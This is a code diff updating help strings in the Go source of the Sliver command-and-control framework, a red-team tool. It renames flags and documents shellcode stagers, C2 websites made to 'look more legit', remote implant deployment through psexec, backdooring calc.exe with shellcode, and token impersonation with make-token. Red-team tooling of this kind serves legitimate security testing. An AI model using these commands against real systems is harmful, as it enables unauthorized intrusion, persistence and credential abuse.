@@ -70,6 +70,8 @@ var (
 
 		consts.WebsitesStr:   websitesHelp,
 		consts.ScreenshotStr: screenshotHelp,
+		consts.MakeTokenStr:  makeTokenHelp,
+		consts.GetEnvStr:     getEnvHelp,
 	}
 
 	jobsHelp = `[[.Bold]]Command:[[.Normal]] jobs <options>
@@ -152,7 +154,7 @@ And like this for multiple bytes:
 generate stager -b '00 0a cc'
 
 [[.Bold]][[.Underline]]++ Output Formats ++[[.Normal]]
-You can use the --output-format flag to print out the shellcode to stdout, in one of the following transform formats:
+You can use the --format flag to print out the shellcode to stdout, in one of the following transform formats:
 [[.Bold]]bash c csharp dw dword hex java js_be js_le num perl pl powershell ps1 py python raw rb ruby sh vbapplication vbscript[[.Normal]]
 `
 	stageListenerHelp = `[[.Bold]]Command:[[.Normal]] stage-listener <options>
@@ -166,16 +168,16 @@ stage-listener --url tcp://1.2.3.4:8080 --profile my-sliver-profile
 
 To create a profile, use the [[.Bold]]new-profile[[.Normal]] command. A common scenario is to create a profile that generates a shellcode, which can act as a stage 2:
 
-new-profile --name windows-shellcode --format shellcode --mtls 1.2.3.4 --skip-symbols
+new-profile --profile-name windows-shellcode --format shellcode --mtls 1.2.3.4 --skip-symbols
 `
 
-	newProfileHelp = `[[.Bold]]Command:[[.Normal]] new-profile [--name] <options>
+	newProfileHelp = `[[.Bold]]Command:[[.Normal]] new-profile [--profile-name] <options>
 [[.Bold]]About:[[.Normal]] Create a new profile with a given name and options, a name is required.
 
 [[.Bold]][[.Underline]]++ Profiles ++[[.Normal]]
 Profiles are an easy way to save a sliver configurate and easily generate multiple copies of the binary with the same
 settings, but will still have per-binary certificates/obfuscation/etc. This command is used with generate-profile:
-	new-profile --name mtls-profile  --mtls foo.example.com --canary 1.foobar.com
+	new-profile --profile-name mtls-profile  --mtls foo.example.com --canary 1.foobar.com
 	generate-profile mtls-profile
 `
 
@@ -255,22 +257,25 @@ Shellcode files should be binary encoded, you can generate Sliver shellcode file
 	websitesHelp = `[[.Bold]]Command:[[.Normal]] websites <options> <operation>
 [[.Bold]]About:[[.Normal]] Add content to HTTP(S) C2 websites to make them look more legit.
 
-[[.Bold]][[.Underline]]++ Operations ++[[.Normal]]
-Operations are used to manage the content of each website and go at the end of the command.
-
-[[.Bold]]ls [[.Normal]] - List the contents of a website, specified with --website
-[[.Bold]]add[[.Normal]] - Add content to a website, specified with --website, --content, and --web-path
-[[.Bold]]rm [[.Normal]] - Remove content from a website, specified with --website and --web-path
+Websites can be thought of as a collection of content identified by a name, Sliver can store any number of
+websites, and each website can host any amount of static content mapped to arbitrary paths. For example, you
+could create a 'blog' website and 'corp' website each with its own collection of content. When starting an
+HTTP(S) C2 listener you can specify which collection of content to host on the C2 endpoint.
 
 [[.Bold]][[.Underline]]++ Examples ++[[.Normal]]
+List websites:
+	websites
+
+List the contents of a website:
+	websites [name]
 
 Add content to a website:
-	websites --website blog --web-path / --content ./index.html add
-	websites --website blog --web-path /public --content ./public --recursive add
+	websites add-content --website blog --web-path / --content ./index.html
+	websites add-content --website blog --web-path /public --content ./public --recursive
 
-Delete content in a website:
-	websites --website blog --web-path /index.html rm
-	websites --website blog --web-path /public --recursive rm
+Delete content from a website:
+	websites rm-content --website blog --web-path /index.html
+	websites rm-content --website blog --web-path /public --recursive
 
 `
 	sideloadHelp = `[[.Bold]]Command:[[.Normal]] sideload <options> <filepath to DLL>
@@ -360,13 +365,34 @@ Each command will have the [[.Bold]]--process[[.Normal]] flag defined, which all
 `
 	psExecHelp = `[[.Bold]]Command:[[.Normal]] psexec <target>
 [[.Bold]]About:[[.Normal]] Start a new sliver as a service on a remote target.
+
+This command uploads a Sliver binary generated on the fly from a profile.
+The profile must be created with the [[.Bold]]service[[.Normal]] format, so that the service manager can properly start and stop the binary.
+
+To create such a profile, use the [[.Bold]]new-profile[[.Normal]] command:
+
+new-profile --format service --skip-symbols --mtls a.bc.de --profile-name win-svc64
+
+Once the profile has been created, run the [[.Bold]]psexec[[.Normal]] command:
+
+psexec -d Description -s ServiceName -p win-svc64 TARGET_FQDN
+
+The [[.Bold]]psexec[[.Normal]] command will use the credentials of the Windows user associated with the current Sliver session.
 `
 	backdoorHelp = `[[.Bold]]Command:[[.Normal]] backdoor <remote file path>
 [[.Bold]]About:[[.Normal]] Inject a sliver shellcode into an existing file on the target system.
 [[.Bold]]Example:[[.Normal]] backdoor --profile windows-shellcode "c:\windows\system32\calc.exe"
 
-[[.Bold]]Remark:[[.Normal]] you must first create a profile that will serve as your base shellcode, with the following command: new-profile --format shellcode --name whatever --http ab.cd
+[[.Bold]]Remark:[[.Normal]] you must first create a profile that will serve as your base shellcode, with the following command: new-profile --format shellcode --profile-name whatever --http ab.cd
 `
+	makeTokenHelp = `[[.Bold]]Command:[[.Normal]] make-token -u USERNAME -d DOMAIN -p PASSWORD
+[[.Bold]]About:[[.Normal]] Creates a new Logon Session from the specified credentials and impersonate the resulting token.
+`
+
+	getEnvHelp = `[[.Bold]]Command:[[.Normal]] getenv [name]
+[[.Bold]]About:[[.Normal]] Retrieve the environment variables for the current session. If no variable name is provided, lists all the environment variables.
+[[.Bold]]Example:[[.Normal]] getenv SHELL
+	`
 )
 
 const (
